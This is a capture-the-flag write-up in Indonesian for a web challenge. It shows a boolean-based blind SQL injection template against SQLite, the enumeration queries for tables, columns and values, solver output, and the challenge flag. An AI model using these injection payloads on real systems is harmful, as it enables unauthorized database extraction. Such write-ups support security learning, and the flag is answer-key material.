# Dogs Lite 🐶

## Description

Under construction my pet dog site

http://20.205.238.7:10125

Author: rootkids#6987

## Hint

- blind huhuhu
- sqlite

## Solve

1. Vulnerability adalah **Blind SQL Injection** (Boolean Based)
2. Ekstraksi database dilakukan dengan query yang valid pada dbms **SQLite**
3. Query injection yang digunakan untuk ekstraksi database adalah sebagai berikut

    ```sql
    ' OR SUBSTR( ( {subquery} ), {index}, 1 ) = '{character}' -- 
    ```
4. Query pada SQLite untuk *subquery* sebagai ekstraksi data

    - Ekstraksi nama tabel

        ```sql
        SELECT name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%'
        ```
    - Ekstraksi nama kolom pada tabel

        ```sql
        SELECT name FROM pragma_table_info('{table_name}')
        ```
    
    - Ekstraksi data pada kolom

        ```sql
        SELECT {column_name} FROM {table_name}
        ```

5. Automasi injection menggunakan script python

    Gunakan script [solve.py](./solver/solver.py) untuk mengekstraksi data pada database

6. Exploit

    - Ekstraksi tabel

        ```bash
        $ python ./solver/solver.py
        QUERY: SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%'

        TRY LETTER at 1: ,
        TRY LETTER at 1: _
        TRY LETTER at 1: {
        TRY LETTER at 1: }
        ...
        TRY LETTER at 18: W
        TRY LETTER at 18: X
        TRY LETTER at 18: Y
        TRY LETTER at 18: Z
        FINAL RESULT IS: users,S3cR3tFl4g5
        ```

    - Ekstraksi kolom pada tabel *S3cR3tFl4g5*

        ```bash
        $ python ./solver/solver.py
        QUERY: SELECT GROUP_CONCAT(name) FROM pragma_table_info('S3cR3tFl4g5')

        TRY LETTER at 1: ,
        TRY LETTER at 1: _
        TRY LETTER at 1: {
        TRY LETTER at 1: }
        ...
        TRY LETTER at 9: W
        TRY LETTER at 9: X
        TRY LETTER at 9: Y
        TRY LETTER at 9: Z
        FINAL RESULT IS: id,value
        ```
    - Ekstraksi kolom *value* pada tabel *S3cR3tFl4g5*

        ```bash
        $ python ./solver/solver.py
        QUERY: SELECT GROUP_CONCAT(value, '') FROM S3cR3tFl4g5

        TRY LETTER at 1: ,
        TRY LETTER at 1: _
        TRY LETTER at 1: {
        TRY LETTER at 1: }
        ...
        TRY LETTER at 33: W
        TRY LETTER at 33: X
        TRY LETTER at 33: Y
        TRY LETTER at 33: Z
        FINAL RESULT IS: KWCTF{d0gsQl1t3_B1inD_1n73c7iOn}
        ```

## Flag

**KWCTF{d0gsQl1t3_B1inD_1n73c7iOn}**